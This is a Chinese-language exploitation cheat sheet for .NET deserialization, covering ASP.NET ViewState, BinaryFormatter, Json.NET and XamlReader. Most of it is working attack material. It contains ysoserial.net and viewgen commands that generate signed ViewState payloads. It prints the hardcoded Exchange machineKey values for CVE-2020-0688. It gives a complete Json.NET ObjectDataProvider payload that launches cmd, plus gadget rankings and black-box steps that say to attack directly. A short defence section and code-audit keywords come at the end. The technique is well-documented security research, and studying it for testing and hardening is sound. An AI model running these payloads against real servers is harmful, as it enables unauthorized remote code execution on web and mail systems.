# .NET 反序列化漏洞利用

## 一句话理解
用户可控数据进入 .NET 反序列化器（`BinaryFormatter` / `Json.NET` / `ObjectStateFormatter` 等），借助框架类库中的 Gadget 链构造任意命令执行；实战中最高频的入口是 IIS 站点回传的 `__VIEWSTATE` 隐藏域。

## 与 Java 反序列化的区别
两者原理同构（不可信数据 → 反序列化器 → Gadget 链），但生态完全独立：

| 对比项 | Java | .NET |
|---|---|---|
| 标准工具 | ysoserial | ysoserial.net |
| 原生格式 | JDK 序列化字节流（`aced0005` 魔头） | BinaryFormatter / ObjectStateFormatter |
| 最高频场景 | Weblogic / Shiro rememberMe / Fastjson | **ViewState（Java 无对应物）** |
| 盲测手段 | URLDNS 链探测 | 无通用 DNS 探测链，靠报错差异探测 |
| 通用程度 | 依赖类库 Gadget（CC 等） | Gadget 多来自 GAC 全局程序集，目标基本都装 |

检测特征速记：
- 请求中 `__VIEWSTATE` 值异常巨大（几十 KB）、出现 `__VIEWSTATEGENERATOR` 字段
- 站点路径含 `.aspx` / `.ashx` / `WebResource.axd` / `ScriptResource.axd`
- 报错堆栈含 `System.Runtime.Serialization`、`System.Web.UI.ObjectStateFormatter`、`Unable to validate data`

## 常见反序列化器危险度速览

| 序列化器 | 允许类型注入 | 危险度 | 说明 |
|---|---|---|---|
| BinaryFormatter / ObjectStateFormatter / LosFormatter | 是 | 极高 | 类型自描述，Gadget 最全 |
| Json.NET（TypeNameHandling≠None） | 是（`$type`） | 高 | 等价 Java 的 Fastjson AutoType |
| NetDataContractSerializer | 是（`__type`） | 高 | WCF 场景常见 |
| XmlSerializer | 仅类型参数可控时 | 中 | 需代码里把用户输入传给构造器 type |
| SoapFormatter | 是 | 高 | 老接口，等同 BinaryFormatter |
| DataContractJsonSerializer | 否 | 低 | 相对安全，类型固定 |
| XamlReader | — | 直接 RCE | XAML 本身就是对象初始化语言 |

## ViewState 反序列化（最高频）

### 1. 原理
ASP.NET WebForm 把页面状态（控件属性、事件数据）序列化后存进 HTML 的 `__VIEWSTATE` 隐藏域，随表单回传。服务端还原页面状态时流程为：

```text
客户端回传 __VIEWSTATE
  → 若加密：用 machineKey 的 decryptionKey（AES/3DES）解密
  → 校验 MAC：用 validationKey（HMACSHA1 等）验证签名，防篡改
  → 反序列化：ObjectStateFormatter 还原对象图（危险点在此）
```

只要攻击者能算出合法 MAC（拿到 machineKey）或目标根本不校验 MAC，就能让服务端反序列化任意的 `ObjectStateFormatter` 对象，配合 Gadget 直达 RCE。

### 2. 攻击条件（三种情形）

**情形 A：machineKey 已知**
- web.config 泄露、任意文件读取拿到 `<machineKey>`
- 硬编码默认密钥（如 Exchange CVE-2020-0688）
- 同服务器其他站点泄露（共享应用池/同目录部署时 machineKey 可能一致）

**情形 B：ASP.NET 4.5 之前且 `enableViewStateMac=false`**
- 无 MAC 校验（裸奔），可提交未签名 payload
- 注意：ASP.NET 4.5.2 起强制开启 MAC，该配置被忽略

**情形 C：无密钥时先探测再判断**
- 用 viewgen 判断目标 ViewState 是否加密/签名
- 提交篡改后的 ViewState，观察报错差异：
  - 报 `Validation of viewstate MAC failed` → MAC 开启，必须找 key
  - 正常处理 → 未校验，直接打

### 3. 利用工具链

#### viewgen：检测与解密

```bash
# 判断 web.config 中的密钥能否解开目标 ViewState（判断是否加密/签名）
viewgen --osview --check --webconfig web.config

# 直接解密目标 ViewState，验证密钥正确性（--modifer 填 __VIEWSTATEGENERATOR 值）
viewgen --osview --decrypt --modifer=ViewStateGenerator --viewstate="/wEPDwUKLTkxNjMwNzEwOQ9w..."

# 生成加密+签名的攻击 ViewState（指定 Gadget 和命令）
viewgen --osview --seng --gadget=TypeConfuseDelegate --command="ping xx.dnslog.cn" \
        --modifer=ViewStateGenerator --webconfig web.config
```

#### ysoserial.net：生成 ViewState payload

```bash
# 需要提供：目标页面路径 path、应用根路径 apppath（用于计算 purpose/修饰符）
# 以及 machineKey 的算法与密钥
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" \
  --path="/xxx.aspx" --apppath="/" \
  --decryptionalg=AES --decryptionkey=<decryptionKey> \
  --validationalg=SHA1 --validationkey=<validationKey>

# 常用附加参数：
#   --minify            压缩 payload（更小）
#   --islegacy          目标为 ASP.NET 4.5 之前（不计算 purpose）
#   --viewstateuserkey  目标设置了 ViewStateUserKey 时必须提供
#   --isdebug           生成带详细错误的版本，用于探测目标环境
```

生成的 payload 填回请求的 `__VIEWSTATE` 字段（URL 编码），刷新页面即触发。

### 4. CVE-2020-0688：Exchange ViewState RCE（模板级案例）
Exchange 所有版本 `ecp/web.config` 中 machineKey **硬编码且公开**，认证后访问 `/ecp/default.aspx` 即可利用：

```bash
# 一条命令生成 payload（ActivitySurrogateSelectorFromFile 加载自定义 C# 利用类）
ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "ExploitClass.cs;System.dll" \
  --path="/ecp/default.aspx" --apppath="/" \
  --decryptionalg=3DES --decryptionkey=8EDC70D0BFA5D5F0D3E5C3B1C3A6E0F4 \
  --validationalg=SHA1  --validationkey=CB2721AB99F8117D5FA5A9CD6F9C0F40F384836D6BCED634A61ABBF5F0437A75
```

流程：登录 OWA 拿到 Cookie → 生成 payload → GET/POST `/ecp/default.aspx` 并替换 `__VIEWSTATE` → 服务端反序列化执行。
启示：**任何"默认/硬编码 machineKey"的产品都等价于免密钥 RCE**（Exchange、SharePoint 历史上均有此类案例）。

### 5. machineKey 从哪里拿
```xml
<!-- web.config / machine.config 中的目标，两个 key 都要 -->
<machineKey validationKey="..." decryptionKey="..." validation="SHA1" decryption="AES"/>
```
- 任意文件读取 / 目录遍历直接读 `web.config`：手法见 [EXP-FileRead](./EXP-FileRead.md)
- 源码泄露：`.git` / `.svn` 备份、部署脚本、压缩包中的配置文件
- 报错回显（自定义错误页关闭时，物理路径泄露可辅助定位 web.config 位置）
- 同服务器其他站点（共享池场景）泄露的 key 可横向尝试

## BinaryFormatter（与 ObjectStateFormatter 同源）

### 1. 漏洞代码示例

```csharp
// 典型漏洞模式：用户输入 Base64 → 直接 BinaryFormatter 反序列化
byte[] data = Convert.FromBase64String(input);
var obj = new BinaryFormatter().Deserialize(new MemoryStream(data));  // 危险：类型由数据自描述
```

BinaryFormatter 的序列化数据中内嵌完整类型名与程序集信息，反序列化时自动加载并实例化任意 GAC 中的类型——这是它比"普通 JSON"危险得多的根本原因。ViewState 底层的 `ObjectStateFormatter` / `LosFormatter` 实现同源，Gadget 通用。

### 2. 高频 Gadget 链

| Gadget | 所在程序集 | 特点 |
|---|---|---|
| TextFormattingRunProperties | WindowsBase（WPF） | 首选。属性还原时触发 `XamlReader.Parse` 解析内嵌 XAML，直达 RCE |
| TypeConfuseDelegate | System.Core | 无需 WPF，`Delegate` 委托混淆调 `Process.Start`，短小通用 |
| ActivitySurrogateSelector | System.Workflow.ComponentModel | 需目标装有 Workflow 组件；可**内存加载 .NET 程序集**，绕过命令执行限制，能干任意事（写文件、内存马、反弹） |
| ActivitySurrogateSelectorFromFile | 同上 | 上述链的"FromFile"变体：加载本地 C# 源码现场编译执行 |

### 3. 生成命令

```bash
# 生成 BinaryFormatter 格式 payload（base64 输出），命令执行 whoami
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc"

# LosFormatter / ObjectStateFormatter 格式（ViewState 内部用的就是这套）
ysoserial.exe -f LosFormatter -g TextFormattingRunProperties -c "calc"

# 内存加载 .NET 程序集（命令受限时的进阶姿势，如 Exchange）
ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelectorFromFile -c "ExploitClass.cs;System.dll"
```

利用方式：payload Base64 编码后塞进对应参数 / Cookie / 请求体（结合具体入口形态），与 Java 场景的传法一致，交叉参考：[EXP-Java-Unserialize](./EXP-Java-Unserialize.md) 的"利用方式"一节。

## Json.NET（Newtonsoft.Json）

### 1. 漏洞条件
两个条件同时满足：`TypeNameHandling` 非 `None` + 反序列化用户输入。

```csharp
// 危险写法：TypeNameHandling 允许 $type 注入，等价 Java Fastjson 的 AutoType
var obj = JsonConvert.DeserializeObject<Object>(input,
    new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All });
```

### 2. Payload（ObjectDataProvider 链）

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Array, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "$values": [
      {
        "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "StartInfo": {
          "$type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
          "FileName": "cmd",
          "Arguments": "/c whoami"
        }
      }
    ]
  }
}
```

生成命令：`ysoserial.exe -f Json.Net -g ObjectDataProvider -c "cmd /c whoami"`

### 3. 两个 Gadget 一句话
- **ObjectDataProvider**：XAML 数据绑定对象，设置 `MethodName` 后，Json.NET 反序列化取属性时触发反射调用指定方法——.NET JSON/XML 场景的万金油链
- **WindowsIdentity**：反序列化时触发 Windows 身份 API 调用并产生可观测差异（报错/行为变化），无回显环境下常用它探测 `$type` 注入是否生效

## 其他格式速览

| 格式/入口 | 要点 |
|---|---|
| LosFormatter | ViewState 底层序列化器（ObjectStateFormatter 的文本包装），Gadget 与 BinaryFormatter 完全相同 |
| XmlSerializer | 需代码将用户可控类型传入构造器（`new XmlSerializer(Type)`），Gadget 用 ObjectDataProvider；单纯反序列化 XML 内容不触发 |
| DataContractJsonSerializer | 类型固定、不支持类型注入，相对安全；但 NetDataContractSerializer 支持 `__type`，同样高危 |
| XamlReader.Parse | 直接解析不可信 XAML 即 RCE，一句话链：`<ResourceDictionary>` 内嵌 `<ObjectDataProvider ObjectType="{x:Type Diag:Process}" MethodName="Start">` 启动进程 |
| .NET Remoting / WCF | 老攻击面：TCP 通道默认走 BinaryFormatter，等于把反序列化端口裸暴露在网络上，找到即通（Microsoft 2019 年已发通告废弃）；WCF 中 NetDataContractSerializer 端点同理 |

## 实战排查思路

### 1. 黑盒
- 见 `.aspx` 站点必看 `__VIEWSTATE`：值异常巨大（几十 KB）说明序列化内容多、Gadget 有承载空间
- 提交篡改 ViewState 观察报错：`Validation of viewstate MAC failed` → MAC 开启需找 key；无报错 → 直接打
- 报错含 `System.Runtime.Serialization` / `Unable to validate data` / `ObjectStateFormatter` 特征时，逐格式试探
- `__VIEWSTATEGENERATOR` 字段存在 → ASP.NET 4.x，直接作为 viewgen 的 `--modifer`

### 2. 白盒
优先搜索关键词：
```text
BinaryFormatter / SoapFormatter / LosFormatter / ObjectStateFormatter
Deserialize / TypeNameHandling / NetDataContractSerializer
XmlSerializer / XamlReader / machineKey / enableViewStateMac / ViewStateUserKey
```
重点确认三件事：入口是否用户可控、TypeNameHandling 取值、machineKey 是否硬编码/默认。

### 3. 工具
- ysoserial.net（GitHub，pwntester/ysoserial.net）：payload 生成标准工具
- viewgen（GitHub，0xACB/viewgen）：ViewState 检测/解密/生成
- Burp ViewStateEditor 插件：包内直接解码/编码 ViewState

## 防御要点
1. machineKey 唯一且保密：绝不硬编码进代码或复用默认值（CVE-2020-0688 的教训），web.config 权限最小化
2. 设置 `ViewStateUserKey`（每会话随机值），即使 key 泄露也增加跨站伪造难度
3. 弃用 BinaryFormatter：.NET Core 3.0+ 已标记废弃、.NET 5+ 直接抛异常，遵循 Microsoft BinaryFormatter 安全指南
4. Json.NET 保持 `TypeNameHandling.None`，或迁移到 System.Text.Json（默认不支持 `$type`）
5. 传不可信数据时只用无类型注入能力的格式（纯 DTO JSON），并对数据做 HMAC 签名
6. ASP.NET 保持 4.5.2+ 并勿尝试关闭 ViewState MAC（新版本已强制开启）

## 速查清单
- 看到 `__VIEWSTATE` + `.aspx`：先判断 MAC 是否开启，再找 machineKey，最后 ysoserial.net 一条命令
- machineKey 两个 key（validation + decryption）+ 算法都要拿全，`--path`/`--apppath` 决定 purpose 是否对得上
- Gadget 优先级：TextFormattingRunProperties（WPF 通用）→ TypeConfuseDelegate（无 WPF）→ ActivitySurrogateSelector*（加载程序集/进阶利用）
- Json.NET 记住一句话：`TypeNameHandling != None` 即高危，payload 用 ObjectDataProvider
- 报错关键词 `System.Runtime.Serialization` 是 .NET 反序列化最直接的存在性证据
- 与 Java 生态互不通吃：ysoserial 的 payload 打不了 .NET，反之亦然

## Reference
- [ysoserial.net - GitHub](https://github.com/pwntester/ysoserial.net)
- [viewgen - GitHub](https://github.com/0xacb/viewgen)
- [Microsoft - BinaryFormatter security guide](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide)
- [ZDI - CVE-2020-0688: RCE on Microsoft Exchange Server through fixed cryptographic keys](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
- [3gstudent - CVE-2020-0688：Exchange 中的 ViewState 利用详解](https://3gstudent.github.io/CVE-2020-0688-Exchange%E4%B8%AD%E7%9A%84ViewState%E5%88%A9%E7%94%A8%E8%AF%A6%E8%A7%A3)
- [zcgonvh/CVE-2020-0688-Exploit - GitHub](https://github.com/zcgonvh/CVE-2020-0688-Exploit)
- [BlackHat USA 2017 - Friday the 13th: JSON Attacks（Alvaro Muñoz & Oleksandr Mirosh）](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
- [BlackHat USA 2017 - Are you my type? Breaking .NET through serialization（James Forshaw）](https://www.blackhat.com/docs/us-17/wednesday/us-17-Forshaw-Are-You-My-Type.pdf)
